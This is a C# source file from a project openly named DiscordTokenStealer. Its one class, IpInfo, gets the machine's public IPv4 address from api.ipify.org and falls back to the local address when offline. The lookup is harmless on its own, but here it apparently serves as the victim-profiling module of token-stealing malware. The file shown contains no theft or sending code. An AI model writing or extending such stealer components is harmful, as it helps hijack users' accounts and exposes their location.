using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;

namespace DiscordTokenStealer;

public static class IpInfo
{
    private static async Task<IPAddress> GetPublicIPv4()
    {
        using HttpClient client = new HttpClient(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true);
        using HttpResponseMessage response = await client.GetAsync(new Uri("https://api.ipify.org"));
        return IPAddress.Parse(await response.Content.ReadAsStringAsync());
    }

    private static async Task<IPAddress> GetLocalIPv4()
    {
        return (await Dns.GetHostEntryAsync(Dns.GetHostName())).AddressList.First(address =>
            address.AddressFamily == AddressFamily.InterNetwork);
    }

    public static async Task<IPAddress> GetIPAddress()
    {
        return NetworkInterface.GetIsNetworkAvailable() ? await GetPublicIPv4() : await GetLocalIPv4();
    }
}